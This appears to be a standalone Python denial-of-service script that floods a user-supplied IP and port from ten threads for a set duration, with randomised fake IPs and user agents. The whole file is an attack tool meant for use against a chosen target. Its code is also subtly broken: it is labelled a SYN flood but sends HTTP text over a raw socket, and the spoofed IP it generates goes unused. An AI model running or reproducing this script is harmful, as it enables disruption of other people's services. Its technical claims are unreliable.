import socket
import random
import threading
import time
from fake_useragent import UserAgent
import sys

def get_fake_ip():
    return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def get_fake_user_agent():
    user_agent = UserAgent()
    return user_agent.random

def syn_flood(fake_ip, fake_user_agent, attack_duration):
    start_time = time.time()

    while time.time() - start_time < attack_duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            headers = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {fake_user_agent}\r\n\r\n"
            sock.sendto(headers.encode('ascii'), (target_ip, target_port))
        except socket.error as e:
            print(f"Error: {e}")
        finally:
            sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python syn.py <target_ip> <target_port> <attack_duration>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    attack_duration = int(sys.argv[3])

    for _ in range(10):
        fake_ip = get_fake_ip()
        fake_user_agent = get_fake_user_agent()
        threading.Thread(target=syn_flood, args=(fake_ip, fake_user_agent, attack_duration)).start()
